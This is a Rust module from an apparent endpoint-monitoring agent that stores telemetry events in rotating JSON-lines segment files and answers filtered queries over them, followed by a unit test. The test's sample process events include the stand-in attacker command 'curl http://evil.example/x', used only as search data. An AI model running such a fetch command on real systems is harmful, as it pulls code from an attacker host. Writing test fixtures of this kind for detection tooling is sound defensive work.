//! The local telemetry store: events as JSON lines in numbered segment files under
//! `state_dir()/telemetry`, oldest segments deleted to stay under the size cap. The sensor
//! appends; the agent answers queries by reading the same files (so queries work even while
//! the sensor restarts).

use std::fs::{self, File, OpenOptions};
use std::io::{BufWriter, Write};
use std::path::{Path, PathBuf};

use anyhow::Result;
use rmm_proto::telemetry::{Event, QUERY_MAX, Query};

const SEGMENTS: u64 = 8;

pub struct Writer {
    dir: PathBuf,
    max_bytes: u64,
    current: u64,
    file: Option<BufWriter<File>>,
    written: u64,
}

fn segments(dir: &Path) -> Vec<(u64, PathBuf)> {
    let mut v: Vec<(u64, PathBuf)> = fs::read_dir(dir)
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|e| {
            let name = e.file_name().to_string_lossy().into_owned();
            let n = name.strip_prefix("seg-")?.strip_suffix(".jsonl")?.parse().ok()?;
            Some((n, e.path()))
        })
        .collect();
    v.sort();
    v
}

pub fn dir() -> Result<PathBuf> {
    crate::config::state_subdir("telemetry")
}

impl Writer {
    pub fn open(dir: PathBuf, max_bytes: u64) -> Result<Writer> {
        fs::create_dir_all(&dir)?;
        let current = segments(&dir).last().map(|s| s.0).unwrap_or(0);
        let mut w = Writer { dir, max_bytes: max_bytes.max(SEGMENTS * 64 * 1024), current, file: None, written: 0 };
        w.open_current()?;
        Ok(w)
    }

    pub fn set_max(&mut self, max_bytes: u64) {
        self.max_bytes = max_bytes.max(SEGMENTS * 64 * 1024);
    }

    fn segment_max(&self) -> u64 {
        self.max_bytes / SEGMENTS
    }

    fn open_current(&mut self) -> Result<()> {
        let path = self.dir.join(format!("seg-{:010}.jsonl", self.current));
        let f = OpenOptions::new().create(true).append(true).open(&path)?;
        self.written = f.metadata().map(|m| m.len()).unwrap_or(0);
        self.file = Some(BufWriter::new(f));
        Ok(())
    }

    pub fn append(&mut self, ev: &Event) -> Result<()> {
        let mut line = serde_json::to_vec(ev)?;
        line.push(b'\n');
        if self.written + line.len() as u64 > self.segment_max() {
            self.flush();
            self.current += 1;
            self.open_current()?;
            // Drop the oldest segments beyond the cap.
            let segs = segments(&self.dir);
            let mut total: u64 = segs.iter().filter_map(|(_, p)| fs::metadata(p).ok()).map(|m| m.len()).sum();
            for (_, p) in &segs {
                if total <= self.max_bytes || segs.len() <= 1 {
                    break;
                }
                total -= fs::metadata(p).map(|m| m.len()).unwrap_or(0);
                let _ = fs::remove_file(p);
            }
        }
        if let Some(f) = &mut self.file {
            f.write_all(&line)?;
        }
        self.written += line.len() as u64;
        Ok(())
    }

    pub fn flush(&mut self) {
        if let Some(f) = &mut self.file {
            let _ = f.flush();
        }
    }

    pub fn bytes(&self) -> u64 {
        segments(&self.dir).iter().filter_map(|(_, p)| fs::metadata(p).ok()).map(|m| m.len()).sum()
    }
}

fn matches(ev: &Event, q: &Query, line_lower: &str, text: Option<&str>) -> bool {
    if q.since.is_some_and(|s| ev.ts < s) || q.until.is_some_and(|u| ev.ts > u) {
        return false;
    }
    if !q.kinds.is_empty() && !q.kinds.contains(&ev.kind) {
        return false;
    }
    if let Some(pid) = q.pid
        && ev.process.as_ref().is_none_or(|p| p.pid != pid && p.ppid != pid)
    {
        return false;
    }
    if let Some(h) = &q.sha256 {
        let h = h.to_ascii_lowercase();
        let hit = ev.process.as_ref().and_then(|p| p.sha256.as_deref()) == Some(h.as_str())
            || ev.file.as_ref().and_then(|f| f.sha256.as_deref()) == Some(h.as_str());
        if !hit {
            return false;
        }
    }
    text.is_none_or(|t| line_lower.contains(t))
}

/// Events matching `q`, newest first. Returns (events, truncated).
pub fn query(dir: &Path, q: &Query) -> (Vec<Event>, bool) {
    let limit = q.limit.unwrap_or(200).clamp(1, QUERY_MAX) as usize;
    let text = q.text.as_deref().map(str::trim).filter(|t| !t.is_empty()).map(str::to_lowercase);
    let mut out = Vec::new();
    for (_, path) in segments(dir).into_iter().rev() {
        let Ok(raw) = fs::read_to_string(&path) else { continue };
        for line in raw.lines().rev() {
            // A cheap text check before parsing: most lines don't match a search.
            let lower = line.to_lowercase();
            if text.as_deref().is_some_and(|t| !lower.contains(t)) {
                continue;
            }
            let Ok(ev) = serde_json::from_str::<Event>(line) else { continue };
            if !matches(&ev, q, &lower, text.as_deref()) {
                // Segments are in time order: once well before `since`, stop.
                if q.since.is_some_and(|s| ev.ts < s - chrono::Duration::minutes(5)) {
                    return (out, false);
                }
                continue;
            }
            out.push(ev);
            if out.len() >= limit {
                return (out, true);
            }
        }
    }
    (out, false)
}

#[cfg(test)]
mod tests {
    use super::*;
    use rmm_proto::telemetry::{EventKind, Proc};

    fn ev(i: u64, cmd: &str) -> Event {
        let mut e = Event::new(EventKind::Process, "start");
        e.seq = i;
        e.process = Some(Proc { pid: i as u32, name: "sh".into(), command_line: cmd.into(), ..Default::default() });
        e
    }

    #[test]
    fn rotates_under_the_cap_and_queries_newest_first() {
        let dir = std::env::temp_dir().join(format!("rmm-store-{}", uuid::Uuid::new_v4()));
        let mut w = Writer::open(dir.clone(), SEGMENTS * 64 * 1024).unwrap();
        for i in 0..20_000 {
            w.append(&ev(i, if i % 1000 == 0 { "curl http://evil.example/x" } else { "ls -la" })).unwrap();
        }
        w.flush();
        assert!(w.bytes() <= SEGMENTS * 64 * 1024 + 64 * 1024, "{} bytes", w.bytes());
        assert!(segments(&dir).len() <= SEGMENTS as usize + 1);
        let (hits, truncated) = query(&dir, &Query { text: Some("EVIL.example".into()), limit: Some(3), ..Default::default() });
        assert_eq!(hits.iter().map(|e| e.seq).collect::<Vec<_>>(), [19000, 18000, 17000]);
        assert!(truncated);
        let (hits, _) = query(&dir, &Query { pid: Some(19_999), ..Default::default() });
        assert_eq!(hits.len(), 1);
        let (hits, _) = query(&dir, &Query { kinds: vec![EventKind::Network], ..Default::default() });
        assert!(hits.is_empty());
        // Reopening continues in the newest segment.
        let w2 = Writer::open(dir.clone(), SEGMENTS * 64 * 1024).unwrap();
        assert_eq!(w2.current, w.current);
        fs::remove_dir_all(&dir).unwrap();
    }
}
